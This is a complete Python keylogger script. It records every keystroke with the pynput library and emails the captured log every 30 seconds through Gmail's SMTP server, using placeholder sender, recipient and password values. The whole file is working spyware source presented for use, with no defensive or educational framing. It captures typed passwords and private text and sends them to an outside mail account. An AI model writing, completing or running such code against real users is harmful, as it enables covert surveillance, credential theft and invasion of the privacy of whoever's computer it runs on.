#!/usr/bin/env python3
"""
Keylogger with Email Reporting.

This script logs keystrokes and sends periodic reports via email.

Usage:
  python3 keylogger.py

Example:
  python3 keylogger.py
"""

import pynput.keyboard
import threading
import smtplib
from email.mime.text import MIMEText

class Keylogger:
    def __init__(self):
        """
        Initializes the Keylogger object.
        """
        self.log = ""
        self.request_shutdown = False
        self.timer = None
        self.is_first_run = True

    def pressed_key(self, key):
        """
        Processes pressed keys and updates the log.

        Args:
            key: The pressed key.
        """
        try:
            self.log += str(key.char)
        except AttributeError:
            special_keys = {
                key.space: " ",
                key.backspace: " Backspace ",
                key.enter: " Enter ",
                key.shift: " Shift ",
                key.ctrl: " Ctrl ",
                key.alt: " Alt "
            }
            self.log += special_keys.get(key, f" {str(key)} ")

    def send_email(self, subject, body, sender, recipients, password):
        """
        Sends an email.

        Args:
            subject (str): The email subject.
            body (str): The email body.
            sender (str): The email sender.
            recipients (list): List of email recipients.
            password (str): The email password.
        """
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = sender
        msg['To'] = ', '.join(recipients)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
            smtp_server.login(sender, password)
            smtp_server.sendmail(sender, recipients, msg.as_string())

        print("\n[+] Email Sent Successfully!\n")

    def report(self):
        """
        Generates and sends a report email.
        """
        email_body = "[+] The Keylogger has been successfully started" if self.is_first_run else self.log
        self.send_email("Keylogger Report", email_body, "test@test.com", ["test@gmail.com"], "password")
        self.log = ""
        if not self.request_shutdown:
            self.timer = threading.Timer(30, self.report)
            self.timer.start()

    def shutdown(self):
        """
        Initiates shutdown of the keylogger.
        """
        self.request_shutdown = True
        if self.timer:
            self.timer.cancel()

    def start(self):
        """
        Starts the keylogger.
        """
        keyboard_listener = pynput.keyboard.Listener(on_press=self.pressed_key)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.start()
